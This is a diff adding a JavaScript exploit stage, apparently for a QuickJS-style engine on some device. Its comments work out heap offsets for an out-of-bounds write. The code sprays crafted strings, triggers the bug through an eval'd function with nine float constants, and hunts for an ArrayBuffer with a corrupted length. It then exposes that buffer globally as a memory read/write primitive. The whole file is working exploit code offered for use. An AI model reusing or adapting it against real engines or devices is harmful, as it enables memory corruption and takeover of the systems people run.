@@ -1,0 +1,45 @@
+"use strict";
+/* Route-2 string-slab variant for 72801 (device stage A).
+ *
+ * b is class 512: 9 distinct float constants in the body -> cpool 9*16=144 B,
+ * BSIZE 504.  With b in a class-512 block the OOB target is at user offset
+ * (108 + 16*cpool) mod 512 = 252 of block k, INDEPENDENT of b's block index
+ * (target = b + 1,310,972 for every k=0..6).
+ *
+ * Spray: 479-char strings.  A string is a single class-512 arena block, so a
+ * slab filled with strings has 16/16 class-512 pages: the +20-slab target
+ * page is always our data, whatever slot b's page occupies (this removes the
+ * foreign-slot JS_DupAtom crash of 16721).  The record is placed at string
+ * data offset 228 (= 252-24) and 248: RJ (scope_next=65535) chains to RT
+ * (scope_next=4), two overflow writes into T[599].
+ */
+var NP = 2600, NQ = 2600, L = 479;
+var RT = [4,0,0,128,5,0,0,0,4,0,0,0,4,0,0,0,4,0,0,0];
+var RJ = [4,0,0,128,5,0,0,0,255,255,0,0,4,0,0,0,4,0,0,0];
+var U = new Uint8Array(L);
+for (var o = 28; o + 40 <= L; o += 40) {
+  for (var k = 0; k < 20; k++) { U[o+k] = RJ[k]; U[o+20+k] = RT[k]; }
+}
+var A = new Array(NP + NQ);
+for (var i = 0; i < NP; i++) A[i] = String.fromCharCode.apply(null, U);
+var X = String.fromCharCode.apply(null, U); X = null;
+var S = '"use strict"; globalThis.f = function ([] = eval("[]")) { var q1=0,q2=0,q3=0; return 1.1+2.2+3.3+4.4+5.5+6.6+7.7+8.8+9.9; };';
+(0, eval)(S);
+for (var i = NP; i < NP + NQ; i++) A[i] = String.fromCharCode.apply(null, U);
+var D = new Array(600);
+for (var i = 0; i < 600; i++) D[i] = new ArrayBuffer(64);
+var T = new Array(600);
+for (var i = 0; i < 600; i++) T[i] = new ArrayBuffer(64);
+T[598] = null;
+var mark = "NOCORR";
+try { f(); } catch (e) {}
+for (var i = 0; i < 600; i++) {
+  if (T[i] !== null && T[i].byteLength > 1024) {
+    mark = "ABLEN[" + i + "]=" + T[i].byteLength;
+    break;
+  }
+}
+var V = null, VAB = null;
+for (var i = 0; i < 600; i++) { if (T[i] !== null && T[i].byteLength > 1024) { VAB = T[i]; break; } }
+if (VAB) { try { V = new Uint8Array(VAB); mark += " VLEN=" + V.length; } catch (e2) { mark += " VERR=" + e2; } }
+globalThis.V = V; globalThis.VAB = VAB; globalThis.T = T;
